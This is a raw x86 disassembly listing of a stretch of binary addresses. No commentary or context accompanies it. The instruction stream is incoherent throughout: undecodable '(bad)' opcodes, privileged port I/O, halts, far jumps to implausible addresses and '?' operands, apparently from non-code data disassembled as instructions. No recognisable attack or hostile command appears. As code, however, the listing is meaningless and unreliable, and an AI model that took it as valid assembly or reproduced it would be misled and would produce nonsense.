  4167e2:	popa   
  4167e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167e4:	add    ebp,edx
  4167e6:	add    bl,bl
  4167e8:	or     esi,esi
  4167ea:	cmp    DWORD PTR [ecx*1-0x27a041d2],eax
  4167f1:	sub    al,0x8d
  4167f3:	je     0x4167cb
  4167f5:	mov    esi,0xf190a03
  4167fa:	clc    
  4167fb:	adc    DWORD PTR [edx+eiz*4-0x3d],eax
  4167ff:	mov    ?,WORD PTR [ecx-0x7942262b]
  416805:	push   0x1f
  416807:	test   ebp,edx
  416809:	sub    BYTE PTR [edx],ch
  41680b:	pop    edx
  41680c:	dec    esi
  41680d:	rcl    DWORD PTR [ebp+0x3d2c266c],0xc4
  416814:	jecxz  0x4167d0
  416816:	xor    bl,BYTE PTR [ebx]
  416818:	in     al,0xed
  41681a:	sbb    al,0xb6
  41681c:	std    
  41681d:	idiv   BYTE PTR [eax-0x29]
  416820:	fidiv  DWORD PTR [edx+0x16]
  416823:	and    al,BYTE PTR [ebx+0x8]
  416826:	or     al,0x6
  416828:	(bad)  
  416829:	popf   
  41682a:	imul   ebx,esp,0xffffffa8
  41682d:	mov    edi,0xe8bc2d23
  416832:	popa   
  416833:	call   FWORD PTR [edi+ecx*1-0x6d]
  416837:	daa    
  416838:	and    al,0xc8
  41683a:	shl    DWORD PTR [ebx],1
  41683c:	dec    edx
  41683d:	scas   al,BYTE PTR es:[edi]
  41683e:	adc    DWORD PTR [ebx+edi*1],eax
  416841:	cdq    
  416842:	cmp    ebx,ebx
  416844:	mov    bl,0x9d
  416846:	jp     0x4167fe
  416848:	les    edi,FWORD PTR [esp+eax*2-0x3e]
  41684c:	add    DWORD PTR [esi+0x46ac75ec],ebx
  416852:	mov    esp,0x5bfe2ef
  416857:	cmp    dl,BYTE PTR [ecx+0x79]
  41685a:	mov    dl,0xfd
  41685c:	adc    eax,0x5776e5cc
  416861:	ss or  eax,0x14832249
  416867:	jne    0x41685e
  416869:	test   DWORD PTR [edi],ebx
  41686b:	fisub  DWORD PTR [edi+0x23060b90]
  416871:	popa   
  416872:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416873:	je     0x416808
  416875:	dec    esi
  416876:	pop    esp
  416877:	xchg   ebp,eax
  416878:	pop    eax
  416879:	js     0x4168c5
  41687b:	repnz inc eax
  41687d:	add    eax,0xbc9f3e69
  416882:	dec    edi
  416883:	aad    0x7c
  416885:	es popf 
  416887:	dec    edx
  416888:	loope  0x41683f
  41688a:	mov    edx,0xa319b1de
  41688f:	add    BYTE PTR [eax+eax*1-0x5382eb3f],0xb8
  416897:	(bad)
  41689a:	repnz fcomp QWORD PTR [ebp-0x41]
  41689e:	imul   eax,DWORD PTR [esi],0x4a8f9dc5
  4168a4:	push   ss
  4168a5:	mov    bh,0xa6
  4168a7:	inc    edx
  4168a8:	ds std 
  4168aa:	sbb    BYTE PTR [ebx+0x60],ah
  4168ad:	jmp    0x41686d
  4168af:	adc    eax,0x335f1de4
  4168b4:	mov    eax,0xe4489ab7
  4168b9:	mov    BYTE PTR [edi-0x3cc521f0],bh
  4168bf:	mov    dh,0xbb
	...
  416931:	add    BYTE PTR [eax],al
  416933:	add    BYTE PTR [ebp-0x78],al
  416936:	sub    al,0x77
  416938:	in     eax,dx
  416939:	neg    DWORD PTR [edi-0x46]
  41693c:	push   eax
  41693d:	inc    ebp
  41693e:	push   ss
  41693f:	xor    DWORD PTR [esi-0x5b],ebx
  416942:	lods   al,BYTE PTR ds:[esi]
  416943:	cld    
  416944:	(bad)  
  416945:	test   BYTE PTR [eax],0x0
  416948:	cmc    
  416949:	add    BYTE PTR [eax],al
  41694b:	add    BYTE PTR [edx-0x60],al
  41694e:	out    0x46,al
  416950:	sub    al,0x8c
  416952:	mul    DWORD PTR [esi-0x753dd037]
  416958:	mov    BYTE PTR es:[ecx],bh
  41695b:	lods   al,BYTE PTR ds:[esi]
  41695c:	aam    0x9f
  41695e:	fisttp WORD PTR [ebp+0x520e1817]
  416964:	stos   DWORD PTR es:[edi],eax
  416965:	jae    0x4169b4
  416967:	daa    
  416968:	lods   eax,DWORD PTR ds:[esi]
  416969:	xchg   ebp,eax
  41696a:	inc    edi
  41696b:	mov    ah,0xcb
  41696d:	sti    
  41696e:	in     al,0xde
  416970:	mov    dl,0x82
  416972:	and    al,0xb
  416974:	pop    ebp
  416975:	in     eax,dx
  416976:	and    BYTE PTR [esi+ebx*4+0x2a],al
  41697a:	push   esi
  41697b:	jne    0x41697d
  41697d:	or     eax,0x4350c460
  416982:	lea    ebx,[eax]
  416984:	mov    ah,0x92
  416986:	fistp  WORD PTR [ebp-0x50bbda6f]
  41698d:	push   DWORD PTR [esi+0x7b]
  416990:	mov    edi,0x86ca223d
  416995:	aam    0xe6
  416997:	sub    bh,dl
  416999:	in     eax,dx
  41699a:	adc    eax,0xc95cf1b0
  41699f:	js     0x4169d8
  4169a1:	mov    cl,0xe0
  4169a3:	hlt    
  4169a4:	enter  0xde11,0xff
  4169a8:	jae    0x416957
  4169aa:	sahf   
  4169ab:	in     eax,0x72
  4169ad:	jb     0x4169cc
  4169af:	and    edi,ecx
  4169b1:	pusha  
  4169b2:	scas   al,BYTE PTR es:[edi]
  4169b3:	adc    ah,BYTE PTR [ecx]
  4169b5:	aad    0x96
  4169b7:	or     DWORD PTR [ecx-0x53],esp
  4169ba:	aad    0xcc
  4169bc:	adc    BYTE PTR [ebp+edx*2-0x78],ch
  4169c0:	scas   al,BYTE PTR es:[edi]
  4169c1:	xor    BYTE PTR [ebp-0x1d],bl
  4169c4:	mov    esi,0x64d0e29e
  4169c9:	lock jp 0x416a1c
  4169cc:	mov    WORD PTR [esi-0x74fc7a09],fs
  4169d2:	and    BYTE PTR [edx],al
  4169d4:	pusha  
  4169d5:	mov    dh,0xf1
  4169d7:	xor    al,0x96
  4169d9:	jge    0x416a07
  4169db:	pop    esi
  4169dc:	add    ch,BYTE PTR [edx+ecx*8]
  4169df:	push   cs
  4169e0:	cli    
  4169e1:	mov    BYTE PTR [ebx+0x32],dh
  4169e4:	mov    bh,BYTE PTR [eax]
  4169e6:	sub    cl,ch
  4169e8:	test   BYTE PTR [edi+ebx*1],dh
  4169eb:	jg     0x4169ea
  4169ed:	or     dh,BYTE PTR [ebx-0x2c1daefb]
  4169f3:	add    BYTE PTR [ebp-0x7b],dh
  4169f6:	ss adc eax,0x976ba1c6
  4169fc:	lods   al,BYTE PTR ds:[esi]
  4169fd:	stos   DWORD PTR es:[edi],eax
  4169fe:	imul   edx
  416a00:	sub    ah,BYTE PTR [ebx]
  416a02:	loop   0x4169b1
  416a04:	pusha  
  416a05:	daa    
  416a06:	(bad)  
  416a07:	mov    eax,0x9eea82b4
  416a0c:	pop    esi
  416a0d:	int3   
  416a0e:	(bad)  
  416a0f:	lods   al,BYTE PTR ds:[esi]
  416a10:	sbb    eax,0xedb0e15b
  416a15:	dec    esp
  416a16:	(bad)  
  416a17:	jnp    0x416a47
  416a19:	push   cs
  416a1a:	shr    BYTE PTR [edx],1
  416a1c:	mov    ebp,0x3cd21f5b
  416a21:	jge    0x416a8b
  416a23:	sub    BYTE PTR ds:0x241d1073,dl
  416a29:	xor    al,0x3
  416a2b:	sbb    al,0xac
  416a2d:	sbb    ebp,ebp
  416a2f:	xchg   edx,eax
  416a30:	(bad)  
  416a31:	jb     0x4169ce
  416a33:	xchg   ecx,eax
  416a34:	dec    ebp
  416a35:	adc    eax,0x15edc81b
  416a3a:	aad    0x47
  416a3c:	xlat   BYTE PTR ds:[ebx]
  416a3d:	std    
  416a3e:	jp     0x416a95
  416a40:	inc    edi
	...
  416ab1:	add    BYTE PTR [eax],al
  416ab3:	add    bh,bl
  416ab5:	mov    esi,0xbb659205
  416aba:	(bad)  
  416abc:	nop
  416abd:	fmul   QWORD PTR [ebx+0x7728b52]
  416ac3:	jp     0x416a80
  416ac5:	test   DWORD PTR [eax],0xf500
  416acb:	add    BYTE PTR [edx-0x74],bh
  416ace:	call   0xf3d2140a
  416ad3:	xlat   BYTE PTR ss:[ebx]
  416ad5:	gs xchg edx,eax
  416ad7:	sbb    cl,BYTE PTR [ebp+0x15]
  416ada:	mov    dl,0x1
  416adc:	push   ebx
  416add:	sahf   
  416ade:	push   eax
  416adf:	ss ret 
  416ae1:	jmp    0x779c4a0b
  416ae6:	mov    dh,BYTE PTR [eax-0x730f6d95]
  416aec:	dec    ebp
  416aed:	in     eax,dx
  416aee:	out    dx,eax
  416aef:	es ret 0x2a09
  416af3:	add    ecx,esp
  416af5:	sub    dh,BYTE PTR [ecx]
  416af7:	inc    ebx
  416af8:	ja     0x416b1c
  416afa:	pop    esi
  416afb:	dec    ecx
  416afc:	ficomp WORD PTR [eax+ebp*2-0x265e6ac5]
  416b03:	fwait
  416b04:	leave  
  416b05:	loope  0x416b05
  416b07:	mov    WORD PTR [edx+0x78923f9c],cs
  416b0d:	out    dx,eax
  416b0e:	cmc    
  416b0f:	cdq    
  416b10:	std    
  416b11:	xchg   edi,eax
  416b12:	lds    ebx,FWORD PTR [edx+0x75]
  416b15:	dec    edx
  416b16:	lods   eax,DWORD PTR ds:[esi]
  416b17:	ins    BYTE PTR es:[edi],dx
  416b18:	into   
  416b19:	sbb    ebp,esp
  416b1b:	adc    DWORD PTR [esi+eiz*1],edx
  416b1e:	js     0x416b30
  416b20:	ja     0x416ab6
  416b22:	dec    esi
  416b23:	test   eax,0x4a5f3863
  416b28:	cmc    
  416b29:	lods   al,BYTE PTR ds:[esi]
  416b2a:	fsubr  QWORD PTR [ecx-0x7c]
  416b2d:	loop   0x416b64
  416b2f:	imul   esp,DWORD PTR [ebx+eax*2-0xf],0x62007f21
  416b37:	jo     0x416b66
  416b39:	mov    ecx,0x4db11e76
  416b3e:	and    eax,0xdbccefce
  416b43:	test   al,0xb6
  416b45:	je     0x416aec
  416b47:	xchg   BYTE PTR [ecx],dh
  416b49:	jae    0x416b40
  416b4b:	rcr    DWORD PTR [edx+0x24],1
  416b4e:	sub    ebx,DWORD PTR [eax]
  416b50:	icebp  
  416b51:	fst    st(3)
  416b53:	scas   eax,DWORD PTR es:[edi]
  416b54:	xor    eax,0x34704a1
  416b59:	push   edi
  416b5a:	sbb    ch,BYTE PTR [edx-0x6d0410f3]
  416b60:	cmp    eax,0xc6a8d0ac
  416b65:	sbb    ebx,DWORD PTR [ecx+0x34]
  416b68:	mov    al,0x2e
  416b6a:	add    DWORD PTR [edi],esp
  416b6c:	cmp    eax,DWORD PTR [ebp-0xe42c209]
  416b72:	and    dl,BYTE PTR [edx+0x2becf5c7]
  416b78:	je     0x416bd3
  416b7a:	ins    BYTE PTR es:[edi],dx
  416b7b:	ds jnp 0x416b8d
  416b7e:	xor    eax,0xf87def49
  416b83:	loop   0x416b26
  416b85:	mov    cl,cl
  416b87:	aam    0x76
  416b89:	out    dx,eax
  416b8a:	lock add BYTE PTR [ebx+0x31],0x60
  416b8f:	dec    esi
  416b90:	cmp    eax,0x907d1d0b
  416b95:	mov    WORD PTR [ecx],ds
  416b97:	jge    0x416b8b
  416b99:	mov    ds:0x66da4dcf,eax
  416b9e:	fs stos DWORD PTR es:[edi],eax
  416ba0:	push   edi
  416ba1:	mov    bl,0x2f
  416ba3:	sti    
  416ba4:	ja     0x416c00
  416ba6:	cmp    BYTE PTR [ebp+0x77da1d05],al
  416bac:	push   es
  416bad:	ror    BYTE PTR [eax-0x60f9a9e1],1
  416bb3:	loope  0x416b75
  416bb5:	call   0xd9985bf6
  416bba:	out    dx,eax
  416bbb:	and    eax,0x108b63d2
  416bc0:	lods   al,BYTE PTR ds:[esi]
	...
  416c31:	add    BYTE PTR [eax],al
  416c33:	add    BYTE PTR [edx],bh
  416c35:	adc    BYTE PTR [edi-0x444040c4],bh
  416c3b:	push   ss
  416c3c:	add    ebx,DWORD PTR [eax-0x29]
  416c3f:	adc    esi,DWORD PTR [edi]
  416c41:	xlat   BYTE PTR ds:[ebx]
  416c42:	adc    esi,DWORD PTR cs:[eax-0xaffff08]
  416c49:	add    BYTE PTR [eax],al
  416c4b:	add    BYTE PTR [eax+0x73],dh
  416c4e:	inc    ebp
  416c4f:	lea    ebp,[eax]
  416c51:	xor    BYTE PTR [esi],cl
  416c53:	lock cs ret 
  416c56:	mov    cl,0x4e
  416c58:	cmp    esi,ecx
  416c5a:	mov    bh,0xfe
  416c5c:	fld    TBYTE PTR [eax+edx*4-0x3]
  416c60:	mov    esp,0xe3a98491
  416c65:	jnp    0x416c05
  416c67:	jne    0x416ce4
  416c69:	pop    ebp
  416c6a:	xor    eax,0xce40e00f
  416c6f:	scas   al,BYTE PTR es:[edi]
  416c70:	jmp    0xf219fa9f
  416c75:	jmp    0x94e28a99
  416c7a:	(bad)  
  416c7b:	std    
  416c7c:	xchg   edx,eax
  416c7d:	or     esp,ecx
  416c7f:	bound  ecx,QWORD PTR [ebx-0x4db72b4b]
  416c85:	ret    0x15f
  416c88:	sbb    BYTE PTR [ebx+eax*1],0x4f
  416c8c:	ins    BYTE PTR es:[edi],dx
  416c8d:	cmp    al,BYTE PTR [ecx]
  416c8f:	xor    esp,0xffffffb6
  416c92:	dec    ecx
  416c93:	pop    edi
  416c94:	push   ebp
  416c95:	xor    eax,0x6df2cec4
  416c9a:	ret    
  416c9b:	xor    esi,DWORD PTR [esi+0x15]
  416c9e:	mov    dh,0xc9
  416ca0:	pop    eax
  416ca1:	xchg   ebp,eax
  416ca2:	sub    eax,0x199f89b3
  416ca7:	xor    dh,BYTE PTR [eax-0x75fdef94]
  416cad:	dec    edi
  416cae:	icebp  
  416caf:	push   esp
  416cb0:	pop    ecx
  416cb1:	gs jne 0x416cf6
  416cb4:	sub    al,0x7d
  416cb6:	in     eax,0xfa
  416cb8:	mov    ebp,0xc5781ee5
  416cbd:	push   ss
  416cbe:	xchg   ebx,eax
  416cbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cc0:	loope  0x416ca9
  416cc2:	push   0xa1c11303
  416cc7:	popf   
  416cc8:	add    al,0xef
  416cca:	inc    edi
  416ccb:	outs   dx,BYTE PTR ds:[esi]
  416ccc:	aas    
  416ccd:	pushf  
  416cce:	cwde   
  416ccf:	ins    BYTE PTR es:[edi],dx
  416cd0:	aam    0x21
  416cd2:	xor    eax,0xe7136a7a
  416cd7:	fnstsw WORD PTR [edi]
  416cd9:	and    al,0x48
  416cdb:	inc    eax
  416cdc:	mov    dh,0xce
  416cde:	cmp    cl,ah
  416ce0:	mov    cl,0xc3
  416ce2:	push   ss
  416ce3:	hlt    
  416ce4:	out    dx,al
  416ce5:	sbb    dl,BYTE PTR [ebx]
  416ce7:	adc    cl,BYTE PTR [edx-0x49bafc12]
  416ced:	loope  0x416d12
  416cef:	dec    esp
  416cf0:	shl    BYTE PTR [eax+0x13],0x91
  416cf4:	popf   
  416cf5:	stos   BYTE PTR es:[edi],al
  416cf6:	int    0xaf
  416cf8:	pop    esp
  416cf9:	(bad)  
  416cfa:	ds out dx,al
  416cfc:	jle    0x416c7e
  416cfe:	popa   
  416cff:	popa   
  416d00:	fmul   QWORD PTR [esi-0x307e2223]
  416d06:	clc    
  416d07:	pop    esi
  416d08:	xor    eax,0x52a8fe68
  416d0d:	div    BYTE PTR [eax+0x734ca1bb]
  416d13:	xchg   esp,eax
  416d14:	in     eax,dx
  416d15:	xor    al,cl
  416d17:	in     eax,dx
  416d18:	mov    edx,0xd72980e6
  416d1d:	jns    0x416cce
  416d1f:	cmp    edi,edx
  416d21:	adc    al,0x95
  416d23:	sti    
  416d24:	mov    esp,0x807acd3
  416d29:	pop    DWORD PTR [ebp+0x7c6cda37]
  416d2f:	xchg   ecx,eax
  416d30:	pop    es
  416d31:	or     BYTE PTR [esi],0xdb
  416d34:	lods   eax,DWORD PTR ds:[esi]
  416d35:	xchg   edx,eax
  416d36:	fcmovnu st,st(4)
  416d38:	push   ebp
  416d39:	or     bl,BYTE PTR [ebx]
  416d3b:	adc    BYTE PTR [eax+0x49],0xea
  416d3f:	retf   0x4c
	...
  416db2:	add    BYTE PTR [eax],al
  416db4:	out    dx,al
  416db5:	repnz cmc 
  416db7:	add    edi,ebp
  416db9:	pop    es
  416dba:	(bad)  
  416dbb:	inc    edx
  416dbd:	xchg   ebx,eax
  416dbe:	pusha  
  416dbf:	push   0x54f817c5
  416dc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dc5:	stc    
  416dc6:	add    BYTE PTR [eax],al
  416dc8:	cmc    
  416dc9:	add    BYTE PTR [eax],al
  416dcb:	add    BYTE PTR [esp+esi*2-0xebe6016],al
  416dd2:	fwait
  416dd3:	in     al,dx
  416dd4:	in     al,0xd6
  416dd6:	xchg   ecx,eax
  416dd7:	mov    eax,0x9bef72bd
  416ddc:	xor    DWORD PTR [eax-0x7113457],esi
  416de2:	xor    eax,0x7e18cbf2
  416de7:	xor    dl,BYTE PTR [eax-0x67]
  416dea:	mov    edi,0x7d981974
  416def:	inc    esi
  416df0:	pop    esi
  416df1:	mov    dl,0xe2
  416df3:	dec    esi
  416df4:	popf   
  416df5:	aaa    
  416df6:	sub    dl,al
  416df8:	xor    DWORD PTR [ebx+esi*4],ebx
  416dfb:	call   0xf849576e
  416e00:	inc    edx
  416e01:	mov    ebx,0xb4c7d809
  416e06:	jne    0x416e76
  416e08:	repz push edi
  416e0a:	pop    ds
  416e0b:	push   ebx
  416e0c:	jp     0x416da6
  416e0e:	adc    al,0x6a
  416e11:	cmc    
  416e12:	cld    
  416e13:	add    dl,BYTE PTR [esi]
  416e15:	jnp    0x416e13
  416e17:	pop    esp
  416e18:	pop    es
  416e19:	pop    ebx
  416e1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e1b:	shr    DWORD PTR [ebp-0x12],cl
  416e1e:	div    eax
  416e20:	(bad)  
  416e21:	xor    ebx,esi
  416e23:	jo     0x416e40
  416e25:	(bad)  
  416e26:	xchg   edi,eax
  416e27:	ss xchg ebx,eax
  416e29:	rcl    DWORD PTR [edi],1
  416e2b:	addr16 jl 0x416e44
  416e2e:	xchg   DWORD PTR [ebx],edi
  416e30:	dec    esp
  416e31:	(bad)  
  416e32:	icebp  
  416e33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e34:	imul   DWORD PTR [esi+0x6834e13e]
  416e3a:	repz ds pop es
  416e3d:	mov    eax,0x515cb447
  416e42:	je     0x416e71
  416e44:	and    al,0xd6
  416e46:	nop
  416e47:	adc    al,0xf5
  416e49:	ret    
  416e4a:	inc    eax
  416e4b:	pusha  
  416e4c:	addr16 pop edx
  416e4e:	sbb    DWORD PTR ds:0xc1f4668c,edx
  416e54:	push   edi
  416e55:	mov    dl,0x45
  416e57:	inc    edx
  416e58:	mov    WORD PTR [esi+0x7c],fs
  416e5b:	or     eax,0xd9d8f70
  416e60:	pop    esi
  416e61:	pop    eax
  416e62:	xchg   ebp,eax
  416e63:	inc    DWORD PTR [edi+0x5d]
  416e66:	xor    BYTE PTR [edi],0xe6
  416e69:	loop   0x416e04
  416e6b:	icebp  
  416e6c:	mov    bh,0x4b
  416e6e:	jno    0x416e5f
  416e70:	data16 fsub DWORD PTR [edx-0x438b01d2]
  416e77:	test   eax,0x61656535
  416e7c:	out    0x76,eax
  416e7e:	mov    al,ds:0xc78aa3b8
  416e83:	shl    BYTE PTR [ebx+eax*4],1
  416e86:	aaa    
  416e87:	or     DWORD PTR [ebx],0x324c9586
  416e8d:	dec    esp
  416e8e:	fadd   QWORD PTR [edi]
  416e90:	sub    al,0x36
  416e92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e93:	cmp    al,0xea
  416e95:	sub    DWORD PTR [ecx+esi*8+0x43e55c21],eax
  416e9c:	aas    
  416e9d:	inc    DWORD PTR [ebp-0x409d53f2]
  416ea3:	(bad)  
  416ea4:	pop    esi
  416ea5:	sbb    eax,esi
  416ea7:	mov    dh,0x0
  416ea9:	aaa    
  416eaa:	and    al,0x53
  416eac:	popf   
  416ead:	pop    edi
  416eae:	outs   dx,DWORD PTR ds:[esi]
  416eaf:	cmc    
  416eb0:	pop    ebp
  416eb1:	(bad)  
  416eb2:	lock outs dx,BYTE PTR ds:[esi]
  416eb4:	cmc    
  416eb5:	inc    esi
  416eb6:	adc    BYTE PTR [edi+ecx*8-0x16],bh
  416eba:	iret   
  416ebb:	sti    
  416ebc:	xor    ecx,DWORD PTR [edx+eax*1+0xe295]
	...
  416f33:	add    BYTE PTR [edi],dl
  416f35:	mov    BYTE PTR [esi-0x6e],ch
  416f38:	push   esi
  416f3a:	dec    DWORD PTR [ebp-0x2a075371]
  416f40:	pop    eax
  416f41:	clc    
  416f42:	rcl    DWORD PTR [esi-0x66],0xfa
  416f46:	add    BYTE PTR [eax],al
  416f48:	cmc    
  416f49:	add    BYTE PTR [eax],al
  416f4b:	add    BYTE PTR [eax+0x9000fb9],bh
  416f51:	dec    ecx
  416f52:	cmp    BYTE PTR ds:0xd9ba8fe7,dl
  416f58:	jle    0x416f18
  416f5a:	mov    al,0x2f
  416f5c:	mov    dl,0x44
  416f5e:	and    eax,0x8866603b
  416f63:	cmp    al,0xe8
  416f65:	fisttp WORD PTR [edx]
  416f67:	out    0xa3,al
  416f69:	inc    ecx
  416f6a:	aam    0xca
  416f6c:	or     DWORD PTR [esi+edi*4-0x34],ebx
  416f70:	push   edx
  416f71:	cmp    BYTE PTR ds:0xb6f9214,ah
  416f77:	test   al,0x6d
  416f79:	ret    
  416f7a:	(bad)
  416f7d:	inc    ecx
  416f7e:	out    dx,eax
  416f7f:	(bad)  
  416f80:	and    BYTE PTR [ecx+esi*1+0x6ce202d5],ah
  416f87:	(bad)  
  416f89:	push   ds
  416f8a:	dec    ebp
  416f8b:	fwait
  416f8c:	(bad)  
  416f8d:	hlt    
  416f8e:	mul    DWORD PTR [ecx-0x7b]
  416f91:	jg     0x416f3c
  416f93:	or     eax,0x9521d70b
  416f98:	dec    esp
  416f99:	push   ebp
  416f9a:	adc    cl,0x87
  416f9d:	aad    0xe0
  416f9f:	push   cs
  416fa0:	gs dec ecx
  416fa2:	and    al,0xd3
  416fa4:	xor    dl,BYTE PTR [esi]
  416fa6:	sar    DWORD PTR [edi-0x3],0x7a
  416faa:	cmp    ebx,DWORD PTR [edx+0x1e]
  416fad:	mov    dh,0xac
  416faf:	shl    BYTE PTR [edi],0x33
  416fb2:	jmp    0xdb50:0x7970366
  416fb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fba:	rcl    BYTE PTR [ebp+0x7caa9540],cl
  416fc0:	ret    
  416fc1:	pop    ebp
  416fc2:	push   eax
  416fc3:	xchg   edx,eax
  416fc4:	cli    
  416fc5:	aad    0x33
  416fc7:	popa   
  416fc8:	cdq    
  416fc9:	pop    eax
  416fca:	int3   
  416fcb:	inc    eax
  416fcc:	and    al,0x66
  416fce:	daa    
  416fcf:	rcl    BYTE PTR ds:0xd2867fdd,cl
  416fd5:	mov    ds:0x106caa88,al
  416fda:	inc    ecx
  416fdb:	iret   
  416fdc:	cmp    esp,eax
  416fde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fe0:	jmp    0x70812695
  416fe5:	mov    ebp,0xb6134a9e
  416fea:	cmp    BYTE PTR [ecx-0x1df314da],bh
  416ff0:	mov    WORD PTR [edi+0x72],?
  416ff3:	xchg   edi,eax
  416ff4:	mov    al,BYTE PTR [edi]
  416ff6:	(bad)  
  416ff7:	mov    eax,0x83a8291
  416ffc:	or     ch,BYTE PTR [esi]
  416ffe:	fs loope 0x416fd2
  417001:	xchg   DWORD PTR [ecx-0x41],ebx
  417004:	dec    edx
  417005:	cmc    
  417006:	mov    edi,0x7fd48362
  41700b:	test   eax,0x3f3d4b65
  417010:	rol    DWORD PTR [edi-0x6b2cc386],cl
  417016:	mov    eax,ds:0xc537b759
  41701b:	dec    ebp
  41701c:	(bad)  
  41701d:	js     0x41701c
  41701f:	xchg   edx,eax
  417020:	add    bl,0x96
  417023:	jae    0x417003
  417025:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417026:	popa   
  417027:	lods   eax,DWORD PTR ds:[esi]
  417028:	adc    DWORD PTR [eax+esi*8],esp
  41702b:	int    0x3e
  41702d:	retf   0xad11
  417030:	dec    esi
  417031:	loope  0x417005
  417033:	inc    ebx
  417034:	shl    esp,cl
  417036:	call   0x8e97974
  41703b:	(bad)  
  41703c:	arpl   WORD PTR [ebp+0x541a7b],sp
	...
  4170b2:	add    BYTE PTR [eax],al
  4170b4:	and    cl,ch
  4170b6:	cmp    ebx,esi
  4170b8:	sti    
  4170b9:	fsubrp st(5),st
  4170bb:	dec    DWORD PTR [ecx+0x49]
  4170be:	ret    
  4170bf:	sub    DWORD PTR [ebp-0x1f],0xffffff82
  4170c3:	inc    edi
  4170c4:	(bad)  
  4170c5:	sti    
  4170c6:	add    BYTE PTR [eax],al
  4170c8:	cmc    
  4170c9:	add    BYTE PTR [eax],al
  4170cb:	add    BYTE PTR [ebx-0x54],bl
  4170ce:	inc    ebp
  4170cf:	imul   edi,DWORD PTR [esi-0x3f46ed56],0x5c
  4170d6:	and    ah,cl
  4170d8:	dec    edx
  4170d9:	fild   WORD PTR [ebp-0x35]
  4170dc:	je     0x4170a1
  4170de:	dec    ecx
  4170df:	nop
  4170e0:	dec    ecx
  4170e1:	cmp    DWORD PTR [eax-0x32dadd44],ebp
  4170e7:	iret   
  4170e8:	adc    eax,esi
  4170ea:	xchg   ebp,eax
  4170eb:	lds    edi,FWORD PTR [edx]
  4170ed:	or     DWORD PTR [edi-0x5bb36689],edi
  4170f3:	adc    BYTE PTR [ebp+0x58],dh
  4170f6:	(bad)  
  4170f7:	and    ah,BYTE PTR [edi]
  4170f9:	loope  0x4170a3
  4170fb:	pop    es
  4170fc:	pop    edx
  4170fd:	scas   eax,DWORD PTR es:[edi]
  4170fe:	pop    edi
  4170ff:	push   ss
  417100:	push   ecx
  417101:	ret    0xf812
  417104:	or     al,0x13
  417106:	dec    esi
  417107:	pushf  
  417108:	stos   BYTE PTR es:[edi],al
  417109:	dec    ebp
  41710a:	xlat   BYTE PTR ds:[ebx]
  41710b:	push   cs
  41710c:	xor    al,0x34
  41710e:	cmc    
  41710f:	or     eax,0x3d957f75
  417114:	mov    cl,0xb1
  417116:	fisub  DWORD PTR [ecx-0x1]
  417119:	push   0xd29a10e
  41711e:	fdiv   DWORD PTR [esi+0x2ff12655]
  417124:	jg     0x4170a6
  417126:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417127:	pushf  
  417128:	cs inc esp
  41712a:	outs   dx,DWORD PTR ds:[esi]
  41712b:	or     ebx,DWORD PTR [esi+0x42]
  41712e:	loope  0x4170d9
  417130:	sub    BYTE PTR [edx+eax*2+0x70],dl
  417134:	cmp    edi,DWORD PTR [esi+eiz*8+0x12]
  417138:	cmc    
  417139:	nop
  41713a:	and    al,0xb9
  41713c:	xor    al,0xab
  41713e:	fcmovu st,st(1)
  417140:	mov    edx,0x771ed70f
  417145:	sbb    dh,BYTE PTR [ecx+ecx*2+0x2a4f9ed9]
  41714c:	push   ds
  41714d:	ins    BYTE PTR es:[edi],dx
  41714e:	retf   
  41714f:	and    BYTE PTR [ecx+0xfeeebdd],cl
  417155:	mov    ds:0x2bb59e9e,al
  41715a:	mov    edi,0x9ea012ef
  41715f:	and    BYTE PTR [ecx-0x7239e191],0x52
  417166:	jle    0x417158
  417168:	test   BYTE PTR [edx-0x6997e4b4],dh
  41716e:	pusha  
  41716f:	sbb    ecx,edx
  417171:	jmp    0x6026a8a
  417176:	loop   0x4171a8
  417178:	mov    esi,0xce7d9ce1
  41717d:	cmp    eax,0xd89bd5f1
  417182:	scas   eax,DWORD PTR es:[edi]
  417183:	shl    BYTE PTR [ebx],cl
  417185:	add    DWORD PTR [esi+0x6e0a9cf4],0x58
  41718c:	and    DWORD PTR [eax+0x53110fd2],esi
  417192:	les    esp,FWORD PTR [edi-0x1c47e5c2]
  417198:	dec    eax
  417199:	mov    ebp,ss
  41719b:	or     DWORD PTR [ebp+0x70],ebx
  41719e:	movups xmm2,XMMWORD PTR [edi]
  4171a1:	popa   
  4171a2:	or     edi,DWORD PTR [esi-0x50bd6245]
  4171a8:	and    BYTE PTR [esi-0x3b89971f],dh
  4171ae:	push   esp
  4171af:	imul   ebp,DWORD PTR [edi+0x5a],0x3722786d
  4171b6:	imul   esp,DWORD PTR [edi-0x76],0x6e
  4171ba:	loopne 0x417189
  4171bc:	xchg   edx,eax
  4171bd:	loope  0x41719c
  4171bf:	mov    ah,0x4c
	...
  417231:	add    BYTE PTR [eax],al
  417233:	add    BYTE PTR [ebx],ah
  417235:	outs   dx,BYTE PTR ds:[esi]
  417236:	xor    ah,BYTE PTR ds:0x6e377d7f
  41723c:	or     BYTE PTR [ebx-0x1b],dl
  41723f:	data16 loopne 0x4172a6
  417242:	xor    bh,BYTE PTR [esp+eax*4-0x4]
  417246:	add    BYTE PTR [eax],al
  417248:	cmc    
  417249:	add    BYTE PTR [eax],al
  41724b:	add    BYTE PTR [esi+esi*1+0x39],dl
  41724f:	cs gs inc ebx
  417252:	adc    eax,0x1c128c3c
  417257:	cmp    dl,BYTE PTR [esi]
  417259:	pop    edi
  41725a:	lds    edx,FWORD PTR [ebx]
  41725c:	scas   eax,DWORD PTR es:[edi]
  41725d:	in     al,dx
  41725e:	in     eax,dx
  41725f:	mov    edi,0x619b7c05
  417264:	adc    ah,BYTE PTR [edi+0x11]
  417267:	sub    DWORD PTR [edi+0x59927ccd],edx
  41726d:	xor    DWORD PTR [esi+0x38],edi
